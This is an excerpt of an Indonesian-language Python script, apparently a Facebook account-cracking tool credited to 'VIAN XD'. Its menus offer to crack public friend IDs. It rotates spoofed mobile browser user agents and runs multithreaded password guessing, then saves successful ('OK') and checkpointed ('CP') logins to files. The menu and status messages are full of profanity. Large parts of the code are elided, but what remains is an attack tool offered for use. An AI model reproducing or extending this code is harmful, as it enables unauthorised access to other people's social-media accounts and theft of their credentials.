...
console = Console()
###----------[ COLOR FOR PRINT ]---------- ###
hapus = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
biru_m = '\x1b[1;92m' # HIJAU
kuning = '\x1b[1;93m' # KUNING
merah = '\x1b[1;94m' # BIRU
hijau = '\x1b[1;95m' # UNGU
...
for xd in range(10000):
    ...
    d='SAMSUNG SM-N900V 4G Build/LRX21V)'
    e=random.randrange(100, 9999)
    f='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76'
    ...
    g='/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0'
...
def uaku():
	try:
		...
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(['Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba',
...
def back():
	login()
def anjim():
	io = '''[bold cyan]AUTHOR:VIAN XD\nTEAM:XNCX CODE\nSTATUS SC:PREMIUM\nVERSION:0.5[bold cyan]'''
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='[bold cyan] INFORMATION SRICPT [/bold cyan]'))
#BUAT.MENG KECE DIKIT
def memez():
    prints(Panel(f""" [{biru_m}01{hapus}]. Crack publik id 
[{biru_m}00{hapus}]. Keluar {merah}exit program{hapus}""",title=f'{merah}•{kuning}•{hijau}•{hijau} MENU INFO {hijau}•{kuning}•{merah}•{hapus}')) 
#------------------[KONTOL]-----------------#
def banner():
	prints(Panel(f"""{P2}            _____ ____  ______ 
     ("      "\ |"  \    /"  ||   _  "\  /"     "|
      \___/   :) \   \  //   |(. |_)  :)(: ______)
        /  ___/  /\\  \/.    ||:     \/  \/    |
       //  \__  |: \.        |(|  _  \\  // ___)
      (:   / "\ |.  \    /:  ||: |_)  :)(:  (
       \_______)|___|\__/|___|(_______/  \__/""",width=80,padding=(0,8),style=f"{color_table}"))
#--------------------[ MASUK LOBANG IBU LU!! ]--------------#
def login():
	try:
...
#	prints(Panel(f"""{P2}01:crak publik\n00:out""",width=80,padding=(0,8),style=f"{color_table}"))
	ridwan_gans_betcok = input('PILIH : ')
	if ridwan_gans_betcok in ['1']:
		craking01()
	elif ridwan_gans_betcok in ['0']:
		...
		back()
def error():
	print(f'{k}SORRY COY OPSI BELUM TERSEDIA ATAU EROR  {x}')
	time.sleep(4)
	back()
#-------------------[ CRACK-MASSAL ]----------------#
def craking01():
	...
	try:
		...
		print('CUG JANGAN BUAT GW KESEL')
		exit()
	if jum<1 or jum>100:
		print('BUSET BANYAK AMAT')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		cetak(nel(f'[red]KETIK"[green]me"[red]UNTUK CRAK DARI TEMEN SENDIRI!!'))
	...
	for userr in uid:
		try:
			...
			print('sinyal lu kek kontollllll')
			exit()
	try:
		...
		print(f'TEMEN LU NOT PUBLIK{x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	prints(Panel(f"""{P2}[01]:crak dari id new{H} [disarankan]\n{P2}[02]:crak dari id old{M}[tidakdisarankan]\n{P2}[03]:crak dari id random""",width=80,padding=(0,8),style=f"{color_table}"))
	hu = input('Pilih : ')
	if hu in ['2','02']:
	...
	print('')
	cetak(nel('''[01]: MOBILE.FACEBOOK Vv1'''))
	print('')
	hc = input('pilih: ')
	if hc in ['1','01']:
...
def passwrd():
	global prog,des
	cetak(nel(f'RESULTS {H}OK{x} AKAN DI SAVE KE {H}{okc}\n{P}RESULTS {K}CP{x}AKAN DI SAVE KE {K}{cpc}'))
		...
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if 'mobile' in method:
					...
					pool.submit(crack,idf,pwv)
		print('')
#		cetak('\t[cyan]└─[gree[cyan] <<[white] ')
		print(f'{h} OK : {h}%s '%(ok))
		print(f'{k} CP : {k}%s{x} '%(cp))
		print(f'DONE CUY OK GK BANYAK ATAU GK OK BERSYUKUR')
		exit()
...
def crack(idf,pwv):
	...
	fff = '%'
	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]LIVE[/]:[green]{(ok)} [/]>[yellow] CHEK[/]:[yellow]{(cp)}')
	prog.advance(des)
